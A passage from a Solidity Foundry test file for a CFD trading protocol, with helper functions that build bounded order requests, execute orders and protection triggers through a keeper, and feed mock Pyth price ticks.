        assertEq(
            uint8(_execute(KEEPER, orderId, price, 1).status),
            uint8(OrderV3Types.LifecycleStatus.Executed),
            "trade executes"
        );
    }

    /// @dev Bounded V3 request with ordinary slippage and finite financial ceilings.
    function _request(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price,
        bool isClose
    ) internal returns (OrderV3Types.OrderRequest memory request) {
        uint256 notional = (size * price) / ORACLE_TO_ASSETS;
        // LONG opens / SHORT closes need price >= target; SHORT opens / LONG closes need price <= target.
        bool priceFloor = (side == CfdTypes.Side.LONG) != isClose;
        request.clientOrderId = keccak256(abi.encode("judge-e2e", ++clientNonce));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice =
            priceFloor ? (price * (10_000 - SLIPPAGE_BPS)) / 10_000 : (price * (10_000 + SLIPPAGE_BPS)) / 10_000;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: notional / 1000, // 10 bps
            maxExecutionNotionalAssets: (notional * 101) / 100,
            maxGrossAccountDebitAssets: margin + notional / 100,
            maxActionChargeAssets: notional / 200, // 50 bps
            maxExplicitFeesAssets: notional / 1000, // 10 bps
            maxPostPositionSize: isClose ? 0 : size,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: 500_000 // 50x
        });
    }

    function _execute(
        address executor,
        uint64 orderId,
        uint256 price,
        uint256 delaySeconds
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        uint64 commitTime = _commitTime(orderId);
        uint256 target = commitTime + delaySeconds;
        _nextBlock(target > vm.getBlockTimestamp() ? target : vm.getBlockTimestamp());
        bytes[] memory tick = _tick(price, commitTime + 1, commitTime);
        vm.prank(executor);
        result = router.executeOrder(orderId, tick);
    }

    function _trigger(
        uint64 protectionId,
        uint256 price
    ) internal returns (uint64 attemptId) {
        _nextBlock(vm.getBlockTimestamp() + 1);
        bytes[] memory tick = _tick(price, vm.getBlockTimestamp(), engine.lastMarkTime());
        vm.prank(KEEPER);
        attemptId = book.triggerPositionProtection(protectionId, tick);
    }

    /// @dev Ordinary keeper mark refresh through the Router's public oracle-update entrypoint.
    function _refresh(
        uint256 price
    ) internal {
        uint256 next = vm.getBlockTimestamp() > engine.lastMarkTime()
            ? vm.getBlockTimestamp()
            : uint256(engine.lastMarkTime()) + 1;
        _nextBlock(next);
        vm.prank(KEEPER);
        router.updateMarkPrice(_tick(price, vm.getBlockTimestamp(), engine.lastMarkTime()));
    }

    function _commitTime(
        uint64 orderId
    ) internal view returns (uint64) {
        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(orderId);
        return pending.commitTime;
    }

    function _nextBlock(
        uint256 timestamp
    ) internal {
        vm.warp(timestamp);
        vm.roll(vm.getBlockNumber() + 1);
    }

    /// @dev Signed Pyth tick for every basket feed (zero confidence), as a Hermes update payload.
    function _tick(
        uint256 price,
        uint256 publishTime,
        uint256 prevPublishTime
    ) internal pure returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, publishTime, prevPublishTime)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

}
```

